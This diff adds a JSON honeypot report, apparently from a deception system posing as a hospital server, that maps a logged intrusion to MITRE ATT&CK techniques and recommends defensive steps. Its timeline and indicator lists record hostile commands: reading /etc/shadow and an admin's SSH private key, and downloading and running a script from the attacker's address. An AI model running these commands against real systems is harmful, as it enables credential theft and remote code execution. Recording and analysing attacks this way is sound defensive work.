@@ -1,0 +1,214 @@
+{
+  "report_id": "CHKR-TRAP-89E",
+  "generated_at": "2026-03-26T15:02:24.368550+00:00",
+  "schema_version": "1.0",
+  "session": {
+    "session_id": "TRAP-89EA2C7DAEF7",
+    "attacker_ip": "185.220.101.47",
+    "institution": "hospital",
+    "container_id": "91e4da31f6987fb4d6577a119df6fec3ebb993bb46d5d1263acc9eccc4e78231",
+    "start_time": "2026-03-26T15:00:48.718054+00:00",
+    "end_time": "2026-03-26T15:02:15.906673+00:00",
+    "duration_s": 87,
+    "total_commands": 10,
+    "max_severity": "critical"
+  },
+  "mitre_attack": {
+    "ttps_observed": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "count": 1,
+        "commands": [
+          "whoami"
+        ]
+      },
+      {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "count": 1,
+        "commands": [
+          "uname -a"
+        ]
+      },
+      {
+        "id": "T1057",
+        "name": "Process Discovery",
+        "count": 1,
+        "commands": [
+          "ps aux"
+        ]
+      },
+      {
+        "id": "T1003.008",
+        "name": "/etc/passwd and /etc/shadow",
+        "count": 2,
+        "commands": [
+          "cat /etc/passwd",
+          "cat /etc/shadow"
+        ]
+      },
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "count": 1,
+        "commands": [
+          "cat /etc/shadow"
+        ]
+      },
+      {
+        "id": "T1083",
+        "name": "File and Directory Discovery",
+        "count": 1,
+        "commands": [
+          "ls -la /home/his_admin/"
+        ]
+      },
+      {
+        "id": "T1552.004",
+        "name": "Private Keys",
+        "count": 1,
+        "commands": [
+          "cat /home/his_admin/.ssh/id_rsa"
+        ]
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "count": 1,
+        "commands": [
+          "wget http://185.220.101.47/payload.sh -O /tmp/p.sh"
+        ]
+      },
+      {
+        "id": "T1222.002",
+        "name": "Linux and Mac File and Directory Permissions Modification",
+        "count": 1,
+        "commands": [
+          "chmod +x /tmp/p.sh"
+        ]
+      }
+    ],
+    "tactic_coverage": [
+      "Command and Control",
+      "Credential Access",
+      "Defense Evasion",
+      "Discovery"
+    ]
+  },
+  "commands_timeline": [
+    {
+      "seq": 1,
+      "timestamp": "2026-03-26T15:00:55.617689+00:00",
+      "command": "whoami",
+      "ttps": [
+        "T1033"
+      ],
+      "severity": "high"
+    },
+    {
+      "seq": 2,
+      "timestamp": "2026-03-26T15:01:04.430121+00:00",
+      "command": "uname -a",
+      "ttps": [
+        "T1082"
+      ],
+      "severity": "high"
+    },
+    {
+      "seq": 3,
+      "timestamp": "2026-03-26T15:01:12.301454+00:00",
+      "command": "ps aux",
+      "ttps": [
+        "T1057"
+      ],
+      "severity": "high"
+    },
+    {
+      "seq": 4,
+      "timestamp": "2026-03-26T15:01:21.881069+00:00",
+      "command": "cat /etc/passwd",
+      "ttps": [
+        "T1003.008"
+      ],
+      "severity": "critical"
+    },
+    {
+      "seq": 5,
+      "timestamp": "2026-03-26T15:01:30.426467+00:00",
+      "command": "cat /etc/shadow",
+      "ttps": [
+        "T1003.008",
+        "T1003"
+      ],
+      "severity": "critical"
+    },
+    {
+      "seq": 6,
+      "timestamp": "2026-03-26T15:01:37.367210+00:00",
+      "command": "ls -la /home/his_admin/",
+      "ttps": [
+        "T1083"
+      ],
+      "severity": "high"
+    },
+    {
+      "seq": 7,
+      "timestamp": "2026-03-26T15:01:45.796802+00:00",
+      "command": "cat /home/his_admin/.ssh/id_rsa",
+      "ttps": [
+        "T1552.004"
+      ],
+      "severity": "high"
+    },
+    {
+      "seq": 8,
+      "timestamp": "2026-03-26T15:01:53.469926+00:00",
+      "command": "wget http://185.220.101.47/payload.sh -O /tmp/p.sh",
+      "ttps": [
+        "T1105"
+      ],
+      "severity": "high"
+    },
+    {
+      "seq": 9,
+      "timestamp": "2026-03-26T15:02:01.398387+00:00",
+      "command": "chmod +x /tmp/p.sh",
+      "ttps": [
+        "T1222.002"
+      ],
+      "severity": "high"
+    },
+    {
+      "seq": 10,
+      "timestamp": "2026-03-26T15:02:09.035553+00:00",
+      "command": "/tmp/p.sh",
+      "ttps": [],
+      "severity": "medium"
+    }
+  ],
+  "iocs": {
+    "attacker_ip": "185.220.101.47",
+    "commands_run": [
+      "whoami",
+      "uname -a",
+      "ps aux",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /home/his_admin/",
+      "cat /home/his_admin/.ssh/id_rsa",
+      "wget http://185.220.101.47/payload.sh -O /tmp/p.sh",
+      "chmod +x /tmp/p.sh",
+      "/tmp/p.sh"
+    ],
+    "files_accessed": [
+      "/etc/passwd",
+      "/etc/shadow",
+      "/home/his_admin/.ssh/id_rsa"
+    ],
+    "outbound_urls": [
+      "http://185.220.101.47/payload.sh"
+    ]
+  },
+  "recommendation": "Rotate all credentials immediately and audit /etc/shadow access. Block egress HTTP/HTTPS from affected subnets at perimeter firewall. Share attacker IOCs with CERT-In. Session severity: CRITICAL."
+}
